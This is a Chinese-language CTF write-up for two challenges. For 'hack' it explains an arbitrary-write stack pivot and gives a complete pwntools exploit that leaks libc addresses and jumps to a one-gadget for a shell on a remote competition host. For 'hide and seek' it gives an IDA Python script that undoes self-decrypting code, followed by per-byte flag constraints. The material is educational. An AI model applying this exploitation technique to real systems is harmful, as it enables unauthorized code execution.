## 高校运维赛
### hack
> 程序自身存在任意地址写漏洞，但因为是一个类似unlink的行为，所以需要两个地址都可写  
>
> 
>
> 观察main函数发现在retn之前恢复esp寄存器使用的不是leave指令而是lea
> esp,[ecx-4]，而ecx寄存器的值保存在栈上，可以使用提供的漏洞来改写，交换一下堆栈上的值，把栈改到堆上就能在retn的时候跳onegadget  
>
> 
    from pwn import *
    #p = process("./hack",env = {"LD_PRELOAD": "./libc6-i386_2.23-0ubuntu10_amd64.so"})
    p = remote("210.32.4.16", 13375)
    libc = ELF("libc6-i386_2.23-0ubuntu10_amd64.so")
    p.recvuntil("Besides you can have two chances to leak, input address: \n")
    p.sendline("134520860")
    p.recvuntil(", ")
    puts = int(p.recv(10),16)
    libc.address = puts - libc.sym["puts"]
    environ = libc.sym["environ"]
    one = libc.address + 0x3a819
    print hex(puts),hex(environ)
    p.sendline(str(environ))
    p.recvuntil(", ")
    stack = int(p.recv(10),16)
    print hex(stack)
    target_stack = stack - 184
    p.recvuntil("The address of the node is ")
    heap = p.recvuntil(",")
    heap = int(heap[0:len(heap)-1],16)
    print hex(heap)
    #gdb.attach(p)
    #raw_input()
    p.send(p32(one)*2 + p32(heap+4) + p32(target_stack - 8))
    p.interactive()
### hide and seek
> 程序在启动后不断对代码块进行解密，在大量解密后才会进入验证过程，可以使用ida
> python脚本自动对程序进行解密（以下代码有一部分可能需要自己手动解）：
    import idc
    import idautils
    def xor_patch(start, end, val):
       for i in range(start, end):
           b = idc.Byte(i) ^ val
           idc.PatchByte(i, b)
           MakeUnkn(i, 1)
       MakeFunction(start)
    def find_mnem(start, mnem='lea'):
       start_ea = start
       for i in range(1000):
           ins = idautils.DecodeInstruction(start_ea)
           if ins.get_canon_mnem() == mnem:
               break
           if i == 100:
               return -1
           start_ea += ins.size
       return start_ea
    break_addr = [0x414dad, 0x414f53, 0x4150f9]
    def auto_ana(start):
       while True:
           print hex(start)
           if start in break_addr:
               print "bp hit %s" % hex(start)
               break
           start_ea = find_mnem(start)
           if (start_ea == -1):
               break
           if GetMnem(start_ea) != 'lea':
               break
           ea = start_ea
           start1 = GetOperandValue(ea, 1)
           ea = start_ea + 0x101 - 0xf6
           if GetMnem(ea) != 'lea':
               break
           end1 = GetOperandValue(ea, 1)
           ea = start_ea + 0x10c - 0xf6
           if GetMnem(ea) != 'mov':
               break
           val1 = GetOperandValue(ea, 1)
           start_ea = find_mnem(ea)
           if (start_ea == -1):
               break
           if GetMnem(start_ea) != 'lea':
               break
           ea = start_ea
           start2 = GetOperandValue(ea, 1)
           ea = start_ea + 0x101 - 0xf6
           if GetMnem(ea) != 'lea':
               break
           end2 = GetOperandValue(ea, 1)
           ea = start_ea + 0x10c - 0xf6
           if GetMnem(ea) != 'mov':
               break
           val2 = GetOperandValue(ea, 1)
           ea = find_mnem(ea, 'call')
           if -1 == ea:
               break
           if GetMnem(ea) != 'call':
               break
           call_addr = GetOperandValue(ea, 0)
           # xor_patch(start1, end1, val1)
           # print "xor(%s, %s, %s)" % (hex(start1), hex(start1), hex(val1))
           xor_patch(start2, end2, val2)
           print "xor(%s, %s, %s)" % (hex(start2), hex(start2), hex(val2))
           start = call_addr
           print "call %s" % hex(call_addr)
       print "%s: %s" % (hex(ea), GetDisasm(ea))
    xor_patch(0x4006EB, 0x40082B, 9)
    auto_ana(0x4166AB)
> 解密的最后几个函数为验证函数，每次验证一个flag字节，可以爆破出flag
    constraints = '''34 * flag[0] + 3 * flag[0] * flag[0] + 120 * flag[0] * flag[0] * flag[0] + 12 == 39437721
    96 * flag[1] + 127 * flag[1] * flag[1] + 41 * flag[1] * flag[1] * flag[1] + 87 == 16633575
    26 * flag[2] + 70 * flag[2] * flag[2] + 12 * flag[2] * flag[2] * flag[2] + 33 == 7345865
    88 * flag[3] + 31 * flag[3] * flag[3] + 71 * flag[3] * flag[3] * flag[3] + 105 == 132601485
    67 * flag[4] + 29 * flag[4] * flag[4] + 69 * flag[4] * flag[4] * flag[4] + 32 == 122670437
    23 * flag[5] + 79 * flag[5] * flag[5] + 117 * flag[5] * flag[5] * flag[5] + 112 == 160988851
    101 * flag[6] + 101 * flag[6] * flag[6] + 13 * flag[6] * flag[6] * flag[6] + 25 == 22215400
    120 * flag[7] + 25 * flag[7] * flag[7] + 37 * flag[7] * flag[7] * flag[7] + 106 == 0x1E7ABC6
    101 * flag[8] + 92 * flag[8] * flag[8] + 40 * flag[8] * flag[8] * flag[8] + 35 == 62063350
    11 * flag[9] + 31 * flag[9] * flag[9] + 67 * flag[9] * flag[9] * flag[9] + 99 == 75702427
    16 * flag[10] + 67 * flag[10] * flag[10] + 74 * flag[10] * flag[10] * flag[10] + 17 == 102031994
    21 * flag[11] + 93 * flag[11] * flag[11] + 67 * flag[11] * flag[11] * flag[11] + 2 == 108583607
    62 * flag[12] + 109 * flag[12] * flag[12] + 107 * flag[12] * flag[12] * flag[12] + 61 == 136067317
    104 * flag[13] + 47 * flag[13] * flag[13] + 117 * flag[13] * flag[13] * flag[13] + 79 ==  117480479
    68 * flag[14] + 124 * flag[14] * flag[14] + 88 * flag[14] * flag[14] * flag[14] + 115 == 76574675
    86 * flag[15] + 50 * flag[15] * flag[15] + (flag[15] * flag[15] * flag[15] << 6) + 93 == 70473929
    100 * flag[16] + 70 * flag[16] * flag[16] + 118 * flag[16] * flag[16] * flag[16] + 84 == 162254112
    39 * flag[17] + 76 * flag[17] * flag[17] + 50 * flag[17] * flag[17] * flag[17] + 23 == 43558378
    101 * flag[18] + 74 * flag[18] * flag[18] + 67 * flag[18] * flag[18] * flag[18] + 45 == 71881179
    31 * flag[19] + 115 * flag[19] * flag[19] + 101 * flag[19] * flag[19] * flag[19] + 7 == 139551094
    20 * flag[20] + 11 * flag[20] * flag[20] + 69 * flag[20] * flag[20] * flag[20] + 119 == 102371891
    83 * flag[21] + 122 * flag[21] * flag[21] + 27 * flag[21] * flag[21] * flag[21] + 111 == 24258171
    34 * flag[22] + 51 * flag[22] * flag[22] + 66 * flag[22] * flag[22] * flag[22] + 10 == 88466850
    16 * flag[23] + 58 * flag[23] * flag[23] + 115 * flag[23] * flag[23] * flag[23] + 35 == 105504704
    50 * flag[24] + 125 * flag[24] * flag[24] + 51 * flag[24] * flag[24] * flag[24] + 18 == 79223518
    26 * flag[25] + 127 * flag[25] * flag[25] + 10 * flag[25] * flag[25] * flag[25] + 3 == 10950294
    122 * flag[26] + 83 * flag[26] * flag[26] + 92 * flag[26] * flag[26] * flag[26] + 60 == 126858297
    56 * flag[27] + 36 * flag[27] * flag[27] + 110 * flag[27] * flag[27] * flag[27] + 69 == 146851829